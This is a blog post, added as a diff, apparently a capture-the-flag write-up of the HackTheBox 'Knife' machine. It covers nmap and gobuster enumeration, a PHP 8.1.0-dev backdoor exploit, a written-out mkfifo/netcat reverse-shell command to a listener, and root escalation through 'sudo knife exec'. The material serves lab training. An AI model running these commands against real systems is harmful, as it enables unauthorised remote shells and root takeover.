@@ -1,0 +1,167 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox - Knife" /><meta name="author" content="Nasrallah" /><meta property="og:locale" content="en" /><meta name="description" content="Learning journey." /><meta property="og:description" content="Learning journey." /><link rel="canonical" href="https://nasrallahbaadi.github.io/posts/Knife/" /><meta property="og:url" content="https://nasrallahbaadi.github.io/posts/Knife/" /><meta property="og:site_name" content="Nasrallah" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-21T01:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Knife" /><meta name="twitter:site" content="@NasrallahBaadi" /><meta name="twitter:creator" content="@Nasrallah" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nasrallah"},"dateModified":"2022-07-22T20:14:44+01:00","datePublished":"2022-02-21T01:00:00+01:00","description":"Learning journey.","headline":"HackTheBox - Knife","mainEntityOfPage":{"@type":"WebPage","@id":"https://nasrallahbaadi.github.io/posts/Knife/"},"url":"https://nasrallahbaadi.github.io/posts/Knife/"}</script><title>HackTheBox - Knife | Nasrallah</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Nasrallah"><meta name="application-name" content="Nasrallah"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Nasrallah</a></div><div class="site-subtitle font-italic">Learning journey</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/NasrallahBaadi" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/NasrallahBaadi" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/NasrallahBaadi" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://app.hackthebox.com/profile/565048" aria-label="HackTheBox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://tryhackme.com/p/Nasrallah" aria-label="TryHackMe" target="_blank" rel="noopener"> <i class="fas fa-cloud"></i> </a> <a href="https://t.me/Sirius1337" aria-label="Telegram" target="_blank" rel="noopener"> <i class="fab fa-telegram"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['baadinasrallah','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Knife</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HackTheBox - Knife</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1645401600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 21, 2022 </em> </span> <span> Updated <em class="" data-ts="1658517284" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 22, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> NasrallahBaadi </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="787 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script></div><hr /><h1 id="description"><strong>Description</strong></h1><p>Hello l33ts, I hope you are doing well. Today we are going to look at <a href="https://app.hackthebox.com/machines/347">Knife</a> from <a href="https://hackthebox.com">HackTheBox</a>, it’s an easy machine where we find a vulnerable version of php running, use an exploit for that to gain access to the machine, after that, we exploit a binary that we can run as root to gain privileged access.</p><h1 id="enumeration"><strong>Enumeration</strong></h1><h2 id="nmap"><span class="mr-2">nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>As usual, let’s run a nmap scan using the following command: <code class="language-plaintext highlighter-rouge">sudo nmap -sC -sV -T4 {target_IP}</code>.</p><ul><li><p>-sC: run all the default scripts.</p><li><p>-sV: Find the version of services running on the target.</p><li><p>-T4: Aggressice scan to provide faster results.</p></ul><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 15:44 EST
+Nmap scan report for 10.10.10.242
+Host is up (0.26s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+</span><span class="gp">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey:
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title:  Emergent Medical Idea
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+</pre></table></code></div></div><p>Nmap shows that the machine has 2 open ports: 22(SSH) and 80(HTTP).</p><h2 id="http"><span class="mr-2">HTTP</span><a href="#http" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s navigate to the webpage.</p><p><img data-src="/assets/img/hackthebox/machines/knife/home.png" alt="home" data-proofer-ignore></p><p>It looks like we have an Emergent Medical Idea application, but there is nothing interesting.</p><h2 id="gobuster"><span class="mr-2">Gobuster</span><a href="#gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s scan for directories and files using <code class="language-plaintext highlighter-rouge">Gobuster</code>.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://10.10.10.242                                 
+<span class="go">===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.242
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/01/31 15:50:23 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/server-status        (Status: 403) [Size: 277]
+
+===============================================================
+</span></pre></table></code></div></div><p>Nothing interesting here too.</p><h2 id="wappalyzer"><span class="mr-2">wappalyzer</span><a href="#wappalyzer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s check the web page with Wappalyzer<strong><em>(Wappalyzer is a browser extension that uncovers the technologies used on websites. It detects content management systems, eCommerce platforms, web servers, JavaScript frameworks, analytics tools and many more.)</em></strong></p><p><img data-src="/assets/img/hackthebox/machines/knife/wapp.png" alt="wapp" data-proofer-ignore></p><p>Let’s google these technologies and see if we can find any vulnerability.</p><p><img data-src="/assets/img/hackthebox/machines/knife/cve.png" alt="cve" data-proofer-ignore></p><p>We found that <code class="language-plaintext highlighter-rouge">php 8.1.0-dev</code> has a Remote Code Execution vulnerability, let’s download an exploit and see what we can do.</p><h1 id="foothold"><strong>Foothold</strong></h1><p>Let’s run the exploit now.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 php_exploit.py           
+<span class="go">Enter the full host url:
+http://10.10.10.242/
+
+Interactive shell is opened on http://10.10.10.242/
+</span><span class="gp">Can't acces tty;</span><span class="w"> </span>job crontol turned off.
+<span class="gp">$</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">james
+
+</span></pre></table></code></div></div><p>Great! we got a shell as <strong>james</strong>, but this is not a functional shell, let’s get one by executing a reverse shell command than sends us james shell.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">rm /tmp/f;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|bash <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 9001 <span class="o">&gt;</span>/tmp/f
+</pre></table></code></div></div><blockquote><p>Note: Change the ip address in the command to yours and set up a listener before executing the command!</p></blockquote><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre><span class="go">┌──(sirius㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 9001                                                                                                                                        1 ⨯
+<span class="go">listening on [any] 9001 ...
+connect to [10.10.17.90] from (UNKNOWN) [10.10.10.242] 41496
+bash: cannot set terminal process group (1006): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">james@knife:/$</span><span class="w"> </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="gp">python3 -c 'import pty;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
+</span><span class="gp">james@knife:/$</span><span class="w"> </span><span class="s1">export TERM=xterm
+</span><span class="go">export TERM=xterm
+</span><span class="gp">james@knife:/$</span><span class="w"> </span>^Z
+<span class="go">zsh: suspended  nc -lnvp 9001
+
+┌──(sirius㉿kali)-[~]
+</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg                                                                                                                             </span>148 ⨯ 1 ⚙
+<span class="go">[1]  + continued  nc -lnvp 9001
+
+</span><span class="gp">james@knife:/$</span><span class="w">
+</span></pre></table></code></div></div><p>Now we have a fully functional shell.</p><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><p>Let’s check what can we run as root.</p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="gp">james@knife:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for james on knife:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+
+</span></pre></table></code></div></div><p>We can run <code class="language-plaintext highlighter-rouge">knife</code> as root. We google knife binary and we find this <a href="https://docs.chef.io/workstation/knife/">Documentation</a>. When we look at the subcommands we see <code class="language-plaintext highlighter-rouge">exec</code>.</p><p><img data-src="/assets/img/hackthebox/machines/knife/exec.png" alt="exec" data-proofer-ignore></p><p>With <code class="language-plaintext highlighter-rouge">exec</code> sub command, we can run ruby scripts. and with our ability to run knife as root, we can give it a ruby script that drops us a root shell.<code class="language-plaintext highlighter-rouge">exec "/bin/bash"</code></p><div class="language-terminal highlighter-rouge"><div class="code-header"> <span data-label-text="Terminal"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="gp">james@knife:~$</span><span class="w"> </span><span class="nb">sudo </span>knife <span class="nb">exec</span>
+<span class="go">An interactive shell is opened
+
+Type your script and do:
+
+1. To run the script, use 'Ctrl D'
+2. To exit, use 'Ctrl/Shift C'
+
+Type here a script...
+exec "/bin/bash"
+</span><span class="gp">root@knife:/home/james#</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">root
+</span><span class="gp">root@knife:/home/james#</span><span class="w">
+</span></pre></table></code></div></div><p>Great! We became root now.</p><hr /><p>Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/machines/'>Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >cve</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox+-+Knife+-+Nasrallah&url=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FKnife%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox+-+Knife+-+Nasrallah&u=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FKnife%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FKnife%2F&text=HackTheBox+-+Knife+-+Nasrallah" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fnasrallahbaadi.github.io%2Fposts%2FKnife%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Preignition/">HackTheBox - Preignition</a><li><a href="/posts/HTB-Appointment/">HackTheBox - Appointment</a><li><a href="/posts/HTB-Sequel/">HackTheBox - Sequel</a><li><a href="/posts/HTB-Responder/">HackTheBox - Responder</a><li><a href="/posts/blunder/">HackTheBox - Blunder</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/hackthissite/">hackthissite</a> <a class="post-tag" href="/tags/hts/">hts</a> <a class="post-tag" href="/tags/basic/">basic</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/html/">html</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/blunder/"><div class="card-body"> <em class="small" data-ts="1645056000" data-df="ll" > Feb 17, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Blunder</h3><div class="text-muted small"><p> Description Hello l33ts, I hope you are doing well. Today we will be doing Blunder from HackTheBox. Blunder is an easy box, we enumerate open ports, we find a webserver that is running a vul...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Redeemer/"><div class="card-body"> <em class="small" data-ts="1655078400" data-df="ll" > Jun 13, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Redeemer</h3><div class="text-muted small"><p> Description Hello l33ts, I hope you are doing well. Today we are going to look at Redeemer from HackTheBox. It’s part of Tier 0 machines from Starting Point. The machines is running redis se...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Preignition/"><div class="card-body"> <em class="small" data-ts="1655424000" data-df="ll" > Jun 17, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Preignition</h3><div class="text-muted small"><p> Description Hello l33ts, I hope you are doing well. Today we are going to look at Preignition from HackTheBox. It’s an easy machine running a webserver, we find a login page through a direct...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/blunder/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Blunder</p></a> <a href="/posts/overpass/" class="btn btn-outline-primary" prompt="Newer"><p>TryHackMe - OverPass</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/NasrallahBaadi">NasrallahBaadi</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/hackthissite/">hackthissite</a> <a class="post-tag" href="/tags/hts/">hts</a> <a class="post-tag" href="/tags/basic/">basic</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/html/">html</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
